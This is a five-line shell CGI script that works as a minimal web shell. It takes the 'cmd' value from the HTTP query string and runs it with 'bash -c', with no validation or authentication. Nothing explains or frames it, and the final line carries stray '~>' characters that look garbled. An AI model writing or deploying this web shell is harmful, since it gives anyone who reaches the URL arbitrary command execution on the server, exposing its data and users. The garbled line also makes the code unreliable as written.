#!/bin/sh
echo "Content-Type: text/plain"
echo ""
CMD=$(printf '%s' "$QUERY_STRING" | sed 's/^cmd=//')
~>bash -c "$CMD"
